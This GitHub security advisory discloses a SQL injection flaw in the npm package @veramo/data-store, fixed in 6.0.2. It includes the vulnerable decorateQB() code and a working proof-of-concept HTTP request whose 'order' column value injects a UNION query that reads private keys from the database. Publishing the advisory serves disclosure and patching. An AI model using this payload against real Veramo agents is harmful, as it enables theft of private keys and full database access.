# [M] Veramo is Vulnerable to SQL Injection in Veramo Data Store ORM

## Summary
Severity: Medium
Advisory: GHSA-38cw-85xc-xr9x
CWE: CWE-89
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-01-16
Source: https://github.com/advisories/GHSA-38cw-85xc-xr9x
Type: github-advisory

## Affected
- npm: `@veramo/data-store` — affected >=0 <6.0.2

## Details
## Summary

An SQL injection vulnerability exists in the `@veramo/data-store` package that allows any authenticated user to execute arbitrary SQL queries against the database. The vulnerability is caused by insufficient validation of the `column` parameter in the `order` array of query requests.

## Details

`packages/data-store/src/data-store-orm.ts` (lines 416-434)

The vulnerability exists in the `decorateQB()` function which processes query ordering parameters:

```typescript
function decorateQB(
  qb: SelectQueryBuilder<any>,
  tableName: string,
  input: FindArgs<any>,
): SelectQueryBuilder<any> {
  if (input?.skip) qb = qb.offset(input.skip)
  if (input?.take) qb = qb.limit(input.take)

  if (input?.order) {
    for (const item of input.order) {
      qb = qb.addSelect(
        qb.connection.driver.escape(tableName) + '.' + qb.connection.driver.escape(item.column),
        item.column,
      )
      qb = qb.orderBy(qb.connection.driver.escape(item.column), item.direction)
    }
  }
  return qb
}
```

**Root Cause:**

1. The `item.column` value from user input is passed directly as the **alias** parameter to `addSelect()` without any sanitization or validation
2. While TypeScript defines allowed column types (e.g., `TCredentialColumns = 'context' | 'type' | ...`), this is only compile-time checking
3. At runtime, the function accepts `FindArgs<any>`, allowing arbitrary strings to bypass type restrictions
4. TypeORM inserts the alias directly into the SQL query, enabling SQL injection

**Affected Endpoints:**

All endpoints are located in `packages/data-store/src/data-store-orm.ts`:

| Endpoint | Method | Line |
|----------|--------|------|
| `dataStoreORMGetIdentifiers` | identifiersQuery() | 85-98 |
| `dataStoreORMGetMessages` | messagesQuery() | 129-153 |
| `dataStoreORMGetVerifiableCredentialsByClaims` | claimsQuery() | 168-198 |
| `dataStoreORMGetVerifiableCredentials` | credentialsQuery() | 227-252 |
| `dataStoreORMGetVerifiablePresentations` | presentationsQuery() | 275-297 |

All these methods call `decorateQB()` which processes the vulnerable `order` parameter.

## PoC

**Prerequisites:**

- A running Veramo agent with the REST API exposed (e.g., via `@veramo/remote-server`)
- Valid authentication credentials (Bearer token)
- The agent uses `@veramo/data-store` with a SQLite or compatible database

**Example Exploit to Extract Private Keys From DB:**

```http
POST /agent/dataStoreORMGetVerifiableCredentialsByClaims HTTP/1.1
Host: localhost:3332
Content-Length: 811
Authorization: Bearer test123
Content-Type: application/json

{ "where":[
    {
      "value": [
        "string"
      ],
      "not": true,
      "op": "foo",
"column":"bar"
    }
  ],
 
  "skip": 0,
  "take": 11111232323230,
"order": [
    {
      "direction": "ASC","column":"issuanceDate\" AS \"issuanceDate\" FROM \"claim\" \"claim\" LEFT JOIN \"identifier\" \"issuer\" ON \"issuer\".\"did\"=\"claim\".\"issuerDid\"  LEFT JOIN \"identifier\" \"subject\" ON \"subject\".\"did\"=\"claim\".\"subjectDid\"  LEFT JOIN \"credential\" \"credential\" ON \"credential\".\"hash\"=\"claim\".\"credentialHash\" where not(claim.isObj in (?)) and 1=0 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,(SELECT json_object('alias', alias, 'type', type, 'privateKeyHex', privateKeyHex) ),22,23,24,25,26,27,28,29 from `private-key`-- -"
    }
  ]
}
```

similar exploit could be used against the other affected endpoints

## Impact

**Attack capabilities:**

- Complete database read access
- Reading or write files into fs depending on dbms used
- Database-specific escalation paths
- Dos through timebased or multiple long running queries

## References
- https://github.com/decentralized-identity/veramo/security/advisories/GHSA-38cw-85xc-xr9x
- https://github.com/decentralized-identity/veramo/pull/1482
- https://github.com/decentralized-identity/veramo/commit/067e39dd76f11ee2d25b99c8361d4f02a4223e3b
- https://github.com/decentralized-identity/veramo
- https://github.com/decentralized-identity/veramo/releases/tag/v6.0.2
